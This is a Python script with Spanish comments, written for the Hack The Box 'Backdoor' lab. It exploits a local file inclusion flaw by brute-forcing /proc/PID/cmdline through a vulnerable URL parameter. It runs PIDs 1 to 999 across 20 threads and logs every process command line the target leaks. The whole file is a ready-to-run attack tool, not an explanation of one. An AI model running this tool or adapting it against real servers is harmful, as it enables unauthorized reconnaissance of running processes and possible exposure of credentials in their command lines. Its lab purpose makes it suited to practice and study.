#!/usr/bin/python3

# script creado por Indiopicaro (https://github.com/Indiopicaro/BruteforcePID)
# este script fue desarrollado con la intencion de completar la pagina backdoor de hack the box

import requests
import sys
import signal
import argparse
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from math import ceil
from tqdm import tqdm

# Colores ANSI
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Ctrl+C handler
def def_handler(sig, frame):
    print(f"\n\n{YELLOW}[!] Saliendo...{RESET}\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Argumentos desde línea de comandos
parser = argparse.ArgumentParser(description="Fuerza bruta de PID sobre endpoint con /proc/[PID]/cmdline")
parser.add_argument('-u', '--url', required=True, help='URL con el marcador PID, ejemplo: http://.../ebookdownload.php?ebookdownloadurl=/proc/PID/cmdline')
parser.add_argument('-o', '--output', help='Archivo donde guardar los resultados válidos')
args = parser.parse_args()

if "PID" not in args.url:
    print(f"{YELLOW}[!] Error: la URL debe contener el marcador 'PID' para reemplazar.{RESET}")
    sys.exit(1)

output_lock = Lock()
total_pids = 1000
progress_bar = None

def check_pid(pid):
    global progress_bar
    url = args.url.replace("PID", str(pid))
    try:
        with requests.Session() as session:
            r = session.get(url, timeout=3)
            if len(r.content) > 82:
                decoded_content = r.content.decode(errors='ignore')
                # Usamos un lock para evitar que la salida se mezcle con la barra de progreso
                with output_lock:
                    if progress_bar:
                        progress_bar.write("\n" + "=" * 60)
                        progress_bar.write(f"{GREEN}[+] PID {pid} VÁLIDO{RESET}")
                        progress_bar.write(f"{CYAN}[+] URL: {url}{RESET}")
                        progress_bar.write(f"{CYAN}[+] Contenido: {decoded_content}{RESET}")
                        progress_bar.write("=" * 60 + "\n")
                    else:
                        print("\n" + "=" * 60)
                        print(f"{GREEN}[+] PID {pid} VÁLIDO{RESET}")
                        print(f"{CYAN}[+] URL: {url}{RESET}")
                        print(f"{CYAN}[+] Contenido: {decoded_content}{RESET}")
                        print("=" * 60 + "\n")
                    
                    if args.output:
                        with open(args.output, "a") as f:
                            f.write("=" * 60 + "\n")
                            f.write(f"PID: {pid}\n")
                            f.write(f"URL: {url}\n")
                            f.write(f"Contenido:\n{decoded_content}\n")
                            f.write("=" * 60 + "\n\n")
    except:
        pass
    
    # Actualizamos la barra de progreso
    if progress_bar:
        progress_bar.update(1)

def makeRequest():
    global progress_bar
    print(f"{CYAN}[+] Iniciando escaneo acelerado...{RESET}")
    
    # Creamos la barra de progreso
    progress_bar = tqdm(total=total_pids-1, desc="Progreso", unit="PID", dynamic_ncols=True)
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        # Usamos list() para forzar la evaluación del map y que la barra de progreso funcione
        list(executor.map(check_pid, range(1, total_pids)))
    
    # Cerramos la barra de progreso al finalizar
    progress_bar.close()

if __name__ == '__main__':
    makeRequest()
